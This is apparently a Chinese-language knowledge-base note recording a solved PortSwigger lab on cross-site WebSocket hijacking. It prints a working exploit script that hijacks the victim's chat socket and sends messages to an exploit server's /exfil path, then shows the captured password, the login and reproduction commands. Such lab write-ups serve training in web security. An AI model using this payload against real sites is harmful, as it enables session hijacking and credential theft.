---
title: "lab-cross-site-websocket-hijacking"
links:
  - target: websockets-family
    relation: evidences
---

# lab-cross-site-websocket-hijacking

> evidences: [[websockets-family]]

- 题面:Cross-site WebSocket hijacking(/web-security/websockets/cross-site-websocket-hijacking;slug 即该目录页,widget 解析出的 lab_id 可直接 launch)
- 实例:https://0a14007a0363c1d3807d0dd8000d00f3.web-security-academy.net
- 利用服务器:https://exploit-0acb00ec03bdc1d180f00c2401aa00b3.exploit-server.net
- 判定目标:劫持 victim(carlos)的聊天 WebSocket,取回其密码并登录;状态:**solved**(solved_check true)

## 关键步

1. `/chat` 表单 `action="wss://<host>/chat"`;`/resources/js/chat.js`:onopen 发 `READY`,
   服务端回 JSON 消息 `{"user":..,"content":..}`(无 origin 校验;会话 cookie `SameSite=None`)。
2. exploit 页(exploit server `responseBody`,DELIVER_TO_VICTIM):
   `<script>var ws=new WebSocket('wss://<lab>/chat');ws.onopen=function(){ws.send("READY")};ws.onmessage=function(e){new Image().src='https://<exploit>/exfil?d='+encodeURIComponent(e.data)};</script>`
3. 从 exploit 服务器 `/log` 读取 exfil 请求(路径可任意,404 也会入日志):
   `{"user":"Hal Pline","content":"No problem carlos, it's ge1z6sqy2nu9sa026hkc"}` → 密码。
4. 登录 carlos/carlos 密码 → solved。注:该 lab **wiener:peter 无效**(login 返回 "Invalid username or password"),
   登录只在拿到 carlos 密码后才有意义。

## 证据摘录

```
lab_http get "https://<exploit>/log" --jar /tmp/b23-jar3.json
 -> 10.0.3.193 GET /exfil?d=%7B%22user%22%3A%22Hal%20Pline%22%2C%22content%22%3A%22No%20problem%20carlos%2C%20it%26apos%3Bs%20ge1z6sqy2nu9sa026hkc%22%7D  (victim UA Chrome/154)
lab_http post "<lab>/login" --form csrf=<csrf> --form username=carlos --form password=ge1z6sqy2nu9sa026hkc --follow
 -> 302 /my-account?id=carlos
solved_check "<lab>/" --jar /tmp/b23-jar3.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch A15EC3915BDC09700EEA6C9FD20970DE0AAF2BFBB87B3E7EC3D8D9800B8E542D --widget-source /web-security/websockets --jar /tmp/b23-jar3.json
lab_http post "https://<exploit>/" --form urlIsHttps=on --form responseFile=/exploit \
  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' --form 'responseBody=<exfil ws 脚本>' --form formAction=DELIVER_TO_VICTIM --follow
lab_http get "https://<exploit>/log" --jar /tmp/b23-jar3.json    # 读 exfil
lab_http post "<lab>/login" --form csrf=<csrf> --form username=carlos --form password=<捕获> --follow
```
